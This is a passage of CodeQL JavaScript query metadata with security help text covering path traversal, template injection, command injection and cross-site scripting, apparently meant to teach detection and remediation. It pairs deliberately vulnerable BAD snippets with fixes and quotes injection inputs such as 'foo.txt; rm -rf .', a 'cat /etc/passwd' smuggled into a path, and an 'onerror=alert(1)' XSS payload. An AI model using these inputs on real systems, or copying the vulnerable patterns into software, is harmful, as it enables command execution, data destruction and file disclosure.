        // GOOD: ensures the path is safe to write to.
        if (fileName.indexOf('..') == -1) {
          entry.pipe(fs.createWriteStream(fileName));
        }
        else {
          console.log('skipping bad path', fileName);
        }
      });

    ```

    ## References
    * Snyk: [Zip Slip Vulnerability](https://snyk.io/research/zip-slip-vulnerability).
    * OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).
    * Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-073/TemplateObjectInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-073/TemplateObjectInjection.bqrs
  metadata:
    name: Template Object Injection
    description: Instantiating a template using a user-controlled object is vulnerable
      to local file read and potential remote code execution.
    kind: path-problem
    problem.severity: error
    security-severity: 9.3
    precision: high
    id: js/template-object-injection
    tags: |-
      security
             external/cwe/cwe-073
             external/cwe/cwe-094
  queryHelp: |
    # Template Object Injection
    Directly using user-controlled objects as arguments to template engines might allow an attacker to do local file reads or even remote code execution.


    ## Recommendation
    Avoid using user-controlled objects as arguments to a template engine. Instead, construct the object explicitly with the specific properties needed by the template.


    ## Example
    In the example below a server uses the user-controlled `profile` object to render the `index` template.


    ```javascript
    var app = require('express')();
    app.set('view engine', 'hbs');

    app.post('/', function (req, res, next) {
        var profile = req.body.profile;
        res.render('index', profile);
    });
    ```
    However, if an attacker adds a `layout` property to the `profile` object then the server will load the file specified by the `layout` property, thereby allowing an attacker to do local file reads.

    The fix is to have the server construct the object, and only add the properties that are needed by the template.


    ```javascript
    var app = require('express')();
    app.set('view engine', 'hbs');

    app.post('/', function (req, res, next) {
        var profile = req.body.profile;
        res.render('index', {
            name: profile.name,
            location: profile.location
        });
    });
    ```

    ## References
    * blog.shoebpatel.com: [The Secret Parameter, LFR, and Potential RCE in NodeJS Apps](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/).
    * cwe.mitre.org: [CWE-73: External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)
    * Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).
    * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-078/CommandInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-078/CommandInjection.bqrs
  metadata:
    name: Uncontrolled command line
    description: |-
      Using externally controlled strings in a command line may allow a malicious
                    user to change the meaning of the command.
    kind: path-problem
    problem.severity: error
    security-severity: 9.8
    precision: high
    id: js/command-line-injection
    tags: |-
      correctness
             security
             external/cwe/cwe-078
             external/cwe/cwe-088
  queryHelp: |
    # Uncontrolled command line
    Code that passes untrusted user input directly to `child_process.exec` or similar APIs that execute shell commands allows the user to execute malicious code.


    ## Recommendation
    If possible, use APIs that don't run shell commands and that accept command arguments as an array of strings rather than a single concatenated string. This is both safer and more portable.

    If given arguments as a single string, avoid simply splitting the string on whitespace. Arguments may contain quoted whitespace, causing them to split into multiple arguments. Use a library like `shell-quote` to parse the string into an array of arguments instead.

    If this approach is not viable, then add code to verify that the user input string is safe before using it.


    ## Example
    The following example shows code that extracts a filename from an HTTP query parameter that may contain untrusted data, and then embeds it into a shell command to count its lines without examining it first:


    ```javascript
    var cp = require("child_process"),
        http = require('http'),
        url = require('url');

    var server = http.createServer(function(req, res) {
        let file = url.parse(req.url, true).query.path;

        cp.execSync(`wc -l ${file}`); // BAD
    });

    ```
    A malicious user can take advantage of this code by executing arbitrary shell commands. For example, by providing a filename like `foo.txt; rm -rf .`, the user can first count the lines in `foo.txt` and subsequently delete all files in the current directory.

    To avoid this catastrophic behavior, use an API such as `child_process.execFileSync` that does not spawn a shell by default:


    ```javascript
    var cp = require("child_process"),
        http = require('http'),
        url = require('url');

    var server = http.createServer(function(req, res) {
        let file = url.parse(req.url, true).query.path;

        cp.execFileSync('wc', ['-l', file]); // GOOD
    });

    ```
    If you want to allow the user to specify other options to `wc`, you can use a library like `shell-quote` to parse the user input into an array of arguments without risking command injection:


    ```javascript
    var cp = require("child_process"),
        http = require('http'),
        url = require('url'),
        shellQuote = require('shell-quote');

    var server = http.createServer(function(req, res) {
        let options = url.parse(req.url, true).query.options;

        cp.execFileSync('wc', shellQuote.parse(options)); // GOOD
    });

    ```
    Alternatively, the original example can be made safe by checking the filename against an allowlist of safe characters before using it:


    ```javascript
    var cp = require("child_process"),
        http = require('http'),
        url = require('url');

    var server = http.createServer(function(req, res) {
        let file = url.parse(req.url, true).query.path;

        // only allow safe characters in file name
        if (file.match(/^[\w\.\-\/]+$/)) {
            cp.execSync(`wc -l ${file}`); // GOOD
        }
    });

    ```

    ## References
    * OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).
    * npm: [shell-quote](https://www.npmjs.com/package/shell-quote).
    * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
    * Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-078/IndirectCommandInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-078/IndirectCommandInjection.bqrs
  metadata:
    name: Indirect uncontrolled command line
    description: |-
      Forwarding command-line arguments to a child process
                    executed within a shell may indirectly introduce
                    command-line injection vulnerabilities.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.3
    precision: medium
    id: js/indirect-command-line-injection
    tags: |-
      correctness
             security
             external/cwe/cwe-078
             external/cwe/cwe-088
  queryHelp: |
    # Indirect uncontrolled command line
    Forwarding command-line arguments to `child_process.exec` or some other library routine that executes a system command within a shell can change the meaning of the command unexpectedly due to unescaped special characters.

    When the forwarded command-line arguments come from a parent process that has not escaped the special characters in the arguments, then the parent process may indirectly be vulnerable to command-line injection since the special characters are evaluated unexpectedly.


    ## Recommendation
    If possible, use APIs that don't run shell commands and accept command arguments as an array of strings rather than a single concatenated string. This is both safer and more portable.

    If given arguments as a single string, avoid simply splitting the string on whitespace. Arguments may contain quoted whitespace, causing them to split into multiple arguments. Use a library like `shell-quote` to parse the string into an array of arguments instead.

    If this approach is not viable, then add code to verify that each forwarded command-line argument is properly escaped before using it.


    ## Example
    The following wrapper script example executes another JavaScript file in a child process and forwards some command-line arguments. This is problematic because the special characters in the command-line arguments may change the meaning of the child process invocation unexpectedly. For instance, if one of the command-line arguments is `"dollar$separated$name"`, then the child process will substitute the two environment variables `$separated` and `$name` before invoking `node`.


    ```javascript
    var cp = require("child_process");

    const args = process.argv.slice(2);
    const script = path.join(__dirname, 'bin', 'main.js');
    cp.execSync(`node ${script} ${args.join(' ')}`); // BAD

    ```
    If another program uses `child_process.execFile` to invoke the above wrapper script with input from a remote user, then there may be a command-line injection vulnerability. This may be surprising, since a command-line invocation with `child_process.execFile` is generally considered safe. But in this case, the remote user input is simply forwarded to the problematic `process.exec` call in the wrapper script.

    To guard against this, use an API that does not perform environment variable substitution, such as `child_process.execFile`:


    ```javascript
    var cp = require("child_process");

    const args = process.argv.slice(2);
    const script = path.join(__dirname, 'bin', 'main.js');
    cp.execFileSync('node', [script].concat(args)); // GOOD

    ```
    If you want to allow the user to specify other options to `node`, you can use a library like `shell-quote` to parse the user input into an array of arguments without risking command injection:


    ```javascript
    var cp = require("child_process"),
        shellQuote = require("shell-quote");

    const args = process.argv.slice(2);
    let nodeOpts = '';
    if (args[0] === '--node-opts') {
        nodeOpts = args[1];
        args.splice(0, 2);
    }
    const script = path.join(__dirname, 'bin', 'main.js');
    cp.execFileSync('node', shellQuote.parse(nodeOpts).concat(script).concat(args)); // GOOD

    ```

    ## References
    * OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).
    * npm: [shell-quote](https://www.npmjs.com/package/shell-quote).
    * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
    * Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-078/SecondOrderCommandInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-078/SecondOrderCommandInjection.bqrs
  metadata:
    name: Second order command injection
    description: |-
      Using user-controlled data as arguments to some commands, such as git clone,
                    can allow arbitrary commands to be executed.
    kind: path-problem
    problem.severity: error
    security-severity: 7.0
    precision: high
    id: js/second-order-command-line-injection
    tags: |-
      correctness
             security
             external/cwe/cwe-078
             external/cwe/cwe-088
  queryHelp: |
    # Second order command injection
    Some shell commands, like `git ls-remote`, can execute arbitrary commands if a user provides a malicious URL that starts with `--upload-pack`. This can be used to execute arbitrary code on the server.


    ## Recommendation
    Sanitize user input before passing it to the shell command. For example, ensure that URLs are valid and do not contain malicious commands.


    ## Example
    The following example shows code that executes `git ls-remote` on a URL that can be controlled by a malicious user.


    ```javascript
    const express = require("express");
    const app = express();

    const cp = require("child_process");

    app.get("/ls-remote", (req, res) => {
      const remote = req.query.remote;
      cp.execFile("git", ["ls-remote", remote]); // NOT OK
    });

    ```
    The problem has been fixed in the snippet below, where the URL is validated before being passed to the shell command.


    ```javascript
    const express = require("express");
    const app = express();

    const cp = require("child_process");

    app.get("/ls-remote", (req, res) => {
      const remote = req.query.remote;
      if (!(remote.startsWith("git@") || remote.startsWith("https://"))) {
        throw new Error("Invalid remote: " + remote);
      }
      cp.execFile("git", ["ls-remote", remote]); // OK
    });

    ```

    ## References
    * Max Justicz: [Hacking 3,000,000 apps at once through CocoaPods](https://justi.cz/security/2021/04/20/cocoapods-rce.html).
    * Git: [Git - git-ls-remote Documentation](https://git-scm.com/docs/git-ls-remote/2.22.0#Documentation/git-ls-remote.txt---upload-packltexecgt).
    * OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).
    * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
    * Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-078/ShellCommandInjectionFromEnvironment.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-078/ShellCommandInjectionFromEnvironment.bqrs
  metadata:
    name: Shell command built from environment values
    description: |-
      Building a shell command string with values from the enclosing
                    environment may cause subtle bugs or vulnerabilities.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.3
    precision: high
    id: js/shell-command-injection-from-environment
    tags: |-
      correctness
             security
             external/cwe/cwe-078
             external/cwe/cwe-088
  queryHelp: |
    # Shell command built from environment values
    Dynamically constructing a shell command with values from the local environment, such as file paths, may inadvertently change the meaning of the shell command. Such changes can occur when an environment value contains characters that the shell interprets in a special way, for instance quotes and spaces. This can result in the shell command misbehaving, or even allowing a malicious user to execute arbitrary commands on the system.


    ## Recommendation
    If possible, use hard-coded string literals to specify the shell command to run, and provide the dynamic arguments to the shell command separately to avoid interpretation by the shell.

    Alternatively, if the shell command must be constructed dynamically, then add code to ensure that special characters in environment values do not alter the shell command unexpectedly.


    ## Example
    The following example shows a dynamically constructed shell command that recursively removes a temporary directory that is located next to the currently executing JavaScript file. Such utilities are often found in custom build scripts.


    ```javascript
    var cp = require("child_process"),
      path = require("path");
    function cleanupTemp() {
      let cmd = "rm -rf " + path.join(__dirname, "temp");
      cp.execSync(cmd); // BAD
    }

    ```
    The shell command will, however, fail to work as intended if the absolute path of the script's directory contains spaces. In that case, the shell command will interpret the absolute path as multiple paths, instead of a single path.

    For instance, if the absolute path of the temporary directory is `/home/username/important project/temp`, then the shell command will recursively delete `/home/username/important` and `project/temp`, where the latter path gets resolved relative to the working directory of the JavaScript process.

    Even worse, although less likely, a malicious user could provide the path `/home/username/; cat /etc/passwd #/important project/temp` in order to execute the command `cat /etc/passwd`.

    To avoid such potentially catastrophic behaviors, provide the directory as an argument that does not get interpreted by a shell:


    ```javascript
    var cp = require("child_process"),
      path = require("path");
    function cleanupTemp() {
      let cmd = "rm",
        args = ["-rf", path.join(__dirname, "temp")];
      cp.execFileSync(cmd, args); // GOOD
    }

    ```

    ## References
    * OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).
    * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
    * Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-078/UnsafeShellCommandConstruction.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-078/UnsafeShellCommandConstruction.bqrs
  metadata:
    name: Unsafe shell command constructed from library input
    description: |-
      Using externally controlled strings in a command line may allow a malicious
                    user to change the meaning of the command.
    kind: path-problem
    problem.severity: error
    security-severity: 6.3
    precision: high
    id: js/shell-command-constructed-from-input
    tags: |-
      correctness
             security
             external/cwe/cwe-078
             external/cwe/cwe-088
  queryHelp: |
    # Unsafe shell command constructed from library input
    Dynamically constructing a shell command with inputs from exported functions may inadvertently change the meaning of the shell command. Clients using the exported function may use inputs containing characters that the shell interprets in a special way, for instance quotes and spaces. This can result in the shell command misbehaving, or even allowing a malicious user to execute arbitrary commands on the system.


    ## Recommendation
    If possible, provide the dynamic arguments to the shell as an array using a safe API such as `child_process.execFile` to avoid interpretation by the shell.

    If given arguments as a single string, avoid simply splitting the string on whitespace. Arguments may contain quoted whitespace, causing them to split into multiple arguments. Use a library like `shell-quote` to parse the string into an array of arguments instead.

    Alternatively, if the command must be interpreted by a shell (for example because it includes I/O redirections), you can use `shell-quote` to escape any special characters in the input before embedding it in the command.


    ## Example
    The following example shows a dynamically constructed shell command that downloads a file from a remote URL.


    ```javascript
    var cp = require("child_process");

    module.exports = function download(path, callback) {
      cp.exec("wget " + path, callback);
    }

    ```
    The shell command will, however, fail to work as intended if the input contains spaces or other special characters interpreted in a special way by the shell.

    Even worse, a client might pass in user-controlled data, not knowing that the input is interpreted as a shell command. This could allow a malicious user to provide the input `http://example.org; cat /etc/passwd` in order to execute the command `cat /etc/passwd`.

    To avoid such potentially catastrophic behaviors, provide the inputs from exported functions as an argument that does not get interpreted by a shell:


    ```javascript
    var cp = require("child_process");

    module.exports = function download(path, callback) {
      cp.execFile("wget", [path], callback);
    }

    ```
    As another example, consider the following code which is similar to the preceding example, but pipes the output of `wget` into `wc -l` to count the number of lines in the downloaded file.


    ```javascript
    var cp = require("child_process");

    module.exports = function download(path, callback) {
      cp.exec("wget " + path + " | wc -l", callback);
    };

    ```
    In this case, using `child_process.execFile` is not an option because the shell is needed to interpret the pipe operator. Instead, you can use `shell-quote` to escape the input before embedding it in the command:


    ```javascript
    var cp = require("child_process");

    module.exports = function download(path, callback) {
      cp.exec("wget " + shellQuote.quote([path]) + " | wc -l", callback);
    };

    ```

    ## References
    * OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).
    * npm: [shell-quote](https://www.npmjs.com/package/shell-quote).
    * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
    * Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-078/UselessUseOfCat.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-078/UselessUseOfCat.bqrs
  metadata:
    name: Unnecessary use of `cat` process
    description: "Using the  `cat` process to read a file is unnecessarily complex,\
      \ inefficient, unportable, and can lead to subtle bugs, or even security vulnerabilities."
    kind: problem
    problem.severity: error
    security-severity: 6.3
    precision: high
    id: js/unnecessary-use-of-cat
    tags: |-
      correctness
             security
             maintainability
             external/cwe/cwe-078
  queryHelp: |
    # Unnecessary use of `cat` process
    Using the unix command `cat` only to read a file is an unnecessarily complex way to achieve something that can be done in a simpler and safer manner using the Node.js `fs.readFile` API.

    The use of `cat` for simple file reads leads to code that is unportable, inefficient, complex, and can lead to subtle bugs or even security vulnerabilities.


    ## Recommendation
    Use `fs.readFile` or `fs.readFileSync` to read files from the file system.


    ## Example
    The following example shows code that reads a file using `cat`:


    ```javascript
    var child_process = require('child_process');

    module.exports = function (name) {
        return child_process.execSync("cat " + name).toString();
    };

    ```
    The code in the example will break if the input `name` contains special characters (including space). Additionally, it does not work on Windows and if the input is user-controlled, a command injection attack can happen.

    The `fs.readFile` API should be used to avoid these potential issues:


    ```javascript
    var fs = require('fs');

    module.exports = function (name) {
        return fs.readFileSync(name).toString();
    };

    ```

    ## References
    * OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection).
    * Node.js: [File System API](https://nodejs.org/api/fs.html).
    * [The Useless Use of Cat Award](http://porkmail.org/era/unix/award.html#cat).
    * Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-079/ExceptionXss.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-079/ExceptionXss.bqrs
  metadata:
    name: Exception text reinterpreted as HTML
    description: |-
      Reinterpreting text from an exception as HTML
                    can lead to a cross-site scripting vulnerability.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.1
    precision: high
    id: js/xss-through-exception
    tags: |-
      security
             external/cwe/cwe-079
             external/cwe/cwe-116
  queryHelp: "# Exception text reinterpreted as HTML\nDirectly writing error messages\
    \ to a webpage without sanitization allows for a cross-site scripting vulnerability\
    \ if parts of the error message can be influenced by a user.\n\n\n## Recommendation\n\
    To guard against cross-site scripting, consider using contextual output encoding/escaping\
    \ before writing user input to the page, or one of the other solutions that are\
    \ mentioned in the references.\n\n\n## Example\nThe following example shows an\
    \ exception being written directly to the document, and this exception can potentially\
    \ be influenced by the page URL, leaving the website vulnerable to cross-site\
    \ scripting.\n\n\n```javascript\nfunction setLanguageOptions() {\n    var href\
    \ = document.location.href,\n        deflt = href.substring(href.indexOf(\"default=\"\
    )+8);\n    \n    try {\n        var parsed = unknownParseFunction(deflt); \n \
    \   } catch(e) {\n        document.write(\"Had an error: \" + e + \".\");\n  \
    \  }\n}\n\n```\n\n## Example\nThis second example shows an input being validated\
    \ using the JSON schema validator `ajv`, and in case of an error, the error message\
    \ is sent directly back in the response.\n\n\n```javascript\nimport express from\
    \ 'express';\nimport Ajv from 'ajv';\n\nlet app = express();\nlet ajv = new Ajv();\n\
    \najv.addSchema({type: 'object', additionalProperties: {type: 'number'}}, 'pollData');\n\
    \napp.post('/polldata', (req, res) => {\n    if (!ajv.validate('pollData', req.body))\
    \ {\n        res.send(ajv.errorsText());\n    }\n});\n\n```\nThis is unsafe, because\
    \ the error message can contain parts of the input. For example, the input `{'<img\
    \ src=x onerror=alert(1)>': 'foo'}` will generate the error `data/<img src=x onerror=alert(1)>\
    \ should be number`, causing reflected XSS.\n\n\n## References\n* OWASP: [DOM\
    \ based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n\
    * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n\
    * OWASP [DOM Based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).\n* OWASP\
    \ [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).\n\
    * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n\
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n\
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-079/ReflectedXss.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-079/ReflectedXss.bqrs
  metadata:
    name: Reflected cross-site scripting
    description: |-
      Writing user input directly to an HTTP response allows for
                    a cross-site scripting vulnerability.
    kind: path-problem
    problem.severity: error
    security-severity: 7.8
    precision: high
    id: js/reflected-xss
    tags: |-
      security
             external/cwe/cwe-079
             external/cwe/cwe-116
  queryHelp: |
    # Reflected cross-site scripting
    Directly writing user input (for example, an HTTP request parameter) to an HTTP response without properly sanitizing the input first, allows for a cross-site scripting vulnerability.

    This kind of vulnerability is also called *reflected* cross-site scripting, to distinguish it from other types of cross-site scripting.


    ## Recommendation
    To guard against cross-site scripting, consider using contextual output encoding/escaping before writing user input to the response, or one of the other solutions that are mentioned in the references.


    ## Example
    The following example code writes part of an HTTP request (which is controlled by the user) directly to the response. This leaves the website vulnerable to cross-site scripting.


    ```javascript
    var app = require('express')();

    app.get('/user/:id', function(req, res) {
      if (!isValidUserId(req.params.id))
        // BAD: a request parameter is incorporated without validation into the response
        res.send("Unknown user: " + req.params.id);
      else
        // TODO: do something exciting
        ;
    });

    ```
    Sanitizing the user-controlled data prevents the vulnerability:


    ```javascript
    var escape = require('escape-html');

    var app = require('express')();

    app.get('/user/:id', function(req, res) {
      if (!isValidUserId(req.params.id))
        // GOOD: request parameter is sanitized before incorporating it into the response
        res.send("Unknown user: " + escape(req.params.id));
      else
        // TODO: do something exciting
        ;
    });

    ```

    ## References
    * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
    * OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).
    * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-079/StoredXss.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-079/StoredXss.bqrs
  metadata:
    name: Stored cross-site scripting
    description: |-
      Using uncontrolled stored values in HTML allows for
                    a stored cross-site scripting vulnerability.
    kind: path-problem
    problem.severity: error
    security-severity: 7.8
    precision: high
    id: js/stored-xss
    tags: |-
      security
             external/cwe/cwe-079
             external/cwe/cwe-116
  queryHelp: |
    # Stored cross-site scripting
    Directly using uncontrolled stored value (for example, file names) to create HTML content without properly sanitizing the input first, allows for a cross-site scripting vulnerability.

    This kind of vulnerability is also called *stored* cross-site scripting, to distinguish it from other types of cross-site scripting.


    ## Recommendation
    To guard against cross-site scripting, consider using contextual output encoding/escaping before using uncontrolled stored values to create HTML content, or one of the other solutions that are mentioned in the references.


    ## Example
    The following example code writes file names directly to a HTTP response. This leaves the website vulnerable to cross-site scripting, if an attacker can choose the file names on the disk.


    ```javascript
    var express = require('express'),
        fs = require('fs');

    express().get('/list-directory', function(req, res) {
        fs.readdir('/public', function (error, fileNames) {
            var list = '<ul>';
            fileNames.forEach(fileName => {
                // BAD: `fileName` can contain HTML elements
                list += '<li>' + fileName + '</li>';
            });
            list += '</ul>'
            res.send(list);
        });
    });

    ```
    Sanitizing the file names prevents the vulnerability:


    ```javascript
    var express = require('express'),
        fs = require('fs'),
        escape = require('escape-html');

    express().get('/list-directory', function(req, res) {
        fs.readdir('/public', function (error, fileNames) {
            var list = '<ul>';
            fileNames.forEach(fileName => {
                // GOOD: escaped `fileName` can not contain HTML elements
                list += '<li>' + escape(fileName) + '</li>';
            });
            list += '</ul>'
            res.send(list);
        });
    });

    ```

    ## References
    * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
    * OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).
    * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-079/UnsafeHtmlConstruction.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-079/UnsafeHtmlConstruction.bqrs
  metadata:
    name: Unsafe HTML constructed from library input
    description: |-
      Using externally controlled strings to construct HTML might allow a malicious
                    user to perform a cross-site scripting attack.
    kind: path-problem
    problem.severity: error
    security-severity: 6.1
    precision: high
    id: js/html-constructed-from-input
    tags: |-
      security
             external/cwe/cwe-079
             external/cwe/cwe-116
  queryHelp: |
    # Unsafe HTML constructed from library input
    When a library function dynamically constructs HTML in a potentially unsafe way, then it's important to document to clients of the library that the function should only be used with trusted inputs. If the function is not documented as being potentially unsafe, then a client may inadvertently use inputs containing unsafe HTML fragments, and thereby leave the client vulnerable to cross-site scripting attacks.


    ## Recommendation
    Document all library functions that can lead to cross-site scripting attacks, and guard against unsafe inputs where dynamic HTML construction is not intended.


    ## Example
    The following example has a library function that renders a boldface name by writing to the `innerHTML` property of an element.


    ```javascript
    module.exports = function showBoldName(name) {
      document.getElementById('name').innerHTML = "<b>" + name + "</b>";
    }

    ```
    This library function, however, does not escape unsafe HTML, and a client that calls the function with user-supplied input may be vulnerable to cross-site scripting attacks.

    The library could either document that this function should not be used with unsafe inputs, or use safe APIs such as `innerText`.


    ```javascript
    module.exports = function showBoldName(name) {
      const bold = document.createElement('b');
      bold.innerText = name;
      document.getElementById('name').appendChild(bold);
    }

    ```
    Alternatively, an HTML sanitizer can be used to remove unsafe content.


    ```javascript

    const striptags = require('striptags');
    module.exports = function showBoldName(name) {
      document.getElementById('name').innerHTML = "<b>" + striptags(name) + "</b>";
    }

    ```

    ## References
    * OWASP: [DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet).
    * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet).
    * OWASP [DOM Based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).
    * OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).
    * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-079/UnsafeJQueryPlugin.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-079/UnsafeJQueryPlugin.bqrs
  metadata:
    name: Unsafe jQuery plugin
    description: A jQuery plugin that unintentionally constructs HTML from some of
      its options may be unsafe to use for clients.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.1
    precision: high
    id: js/unsafe-jquery-plugin
    tags: |-
      security
             external/cwe/cwe-079
             external/cwe/cwe-116
             frameworks/jquery
  queryHelp: "# Unsafe jQuery plugin\nLibrary plugins, such as those for the jQuery\
    \ library, are often configurable through options provided by the clients of the\
    \ plugin. Clients, however, do not know the implementation details of the plugin,\
    \ so it is important to document the capabilities of each option. The documentation\
    \ for the plugin options that the client is responsible for sanitizing is of particular\
    \ importance. Otherwise, the plugin may write user input (for example, a URL query\
    \ parameter) to a web page without properly sanitizing it first, which allows\
    \ for a cross-site scripting vulnerability in the client application through dynamic\
    \ HTML construction.\n\n\n## Recommendation\nDocument all options that can lead\
    \ to cross-site scripting attacks, and guard against unsafe inputs where dynamic\
    \ HTML construction is not intended.\n\n\n## Example\nThe following example shows\
    \ a jQuery plugin that selects a DOM element, and copies its text content to another\
    \ DOM element. The selection is performed by using the plugin option `sourceSelector`\
    \ as a CSS selector.\n\n\n```javascript\njQuery.fn.copyText = function(options)\
    \ {\n\t// BAD may evaluate `options.sourceSelector` as HTML\n\tvar source = jQuery(options.sourceSelector),\n\
    \t    text = source.text();\n\tjQuery(this).text(text);\n}\n\n```\nThis is, however,\
    \ not a safe plugin, since the call to `jQuery` interprets `sourceSelector` as\
    \ HTML if it is a string that starts with `<`.\n\nInstead of documenting that\
    \ the client is responsible for sanitizing `sourceSelector`, the plugin can use\
    \ `jQuery.find` to always interpret `sourceSelector` as a CSS selector:\n\n\n\
    ```javascript\njQuery.fn.copyText = function(options) {\n\t// GOOD may not evaluate\
    \ `options.sourceSelector` as HTML\n\tvar source = jQuery.find(options.sourceSelector),\n\
    \t    text = source.text();\n\tjQuery(this).text(text);\n}\n\n```\n\n## References\n\
    * OWASP: [DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet).\n\
    * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n\
    * OWASP [DOM Based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).\n* OWASP\
    \ [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).\n\
    * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n\
    * jQuery: [Plugin creation](https://learn.jquery.com/plugins/basic-plugin-creation/).\n\
    * Bootstrap: [XSS vulnerable bootstrap plugins](https://github.com/twbs/bootstrap/pull/27047).\n\
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n\
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-079/Xss.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-079/Xss.bqrs
